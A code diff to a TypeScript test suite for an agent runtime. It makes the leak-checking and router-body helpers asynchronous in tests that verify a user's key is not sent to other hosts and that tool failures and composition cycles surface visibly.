@@ -1306,7 +1716,7 @@ describe("the visitor's key reaches the router they chose, and nothing else", ()
     const c = h.captured.find((x) => x.url === peerUrl)!;
     expect(c.request.credentials).toBe("omit");
     expect(c.request.headers.get("authorization")).toBeNull();
-    expect(leaks([c], [], [], SENTINEL)).toEqual([]);
+    expect(await leaks([c], [], [], SENTINEL)).toEqual([]);
   });
 
   /** A denied origin is refused and named, and nothing goes out. */
@@ -1507,7 +1917,7 @@ describe("execution is bounded and failures are visible", () => {
     expect(s.runtime.conversation).not.toBeNull();
     await s.runtime.ask("go");
     expect(s.runtime.trace().some((e) => e.event === "cycle_refused")).toBe(true);
-    const toolResults = h.routerBodies().flatMap((b) => b.messages.filter((m) => m.role === "tool").map((m) => m.content));
+    const toolResults = (await h.routerBodies()).flatMap((b) => b.messages.filter((m) => m.role === "tool").map((m) => m.content));
     expect(toolResults.some((c) => c.includes("Composition cycle refused: a → b → a"))).toBe(true);
   });
 
@@ -1515,7 +1925,7 @@ describe("execution is bounded and failures are visible", () => {
     const h = harness({ replies: [callTool("sommelier", { q: "x" }), say("That is not something I can do.")] });
     const s = await session({ key: SENTINEL, h });
     await s.runtime.ask("ask the sommelier");
-    const toolResults = h.routerBodies().flatMap((b) => b.messages.filter((m) => m.role === "tool").map((m) => m.content));
+    const toolResults = (await h.routerBodies()).flatMap((b) => b.messages.filter((m) => m.role === "tool").map((m) => m.content));
     expect(toolResults[0]).toContain("FAILED");
     expect(toolResults[0]).toContain("not an agent in this network");
   });
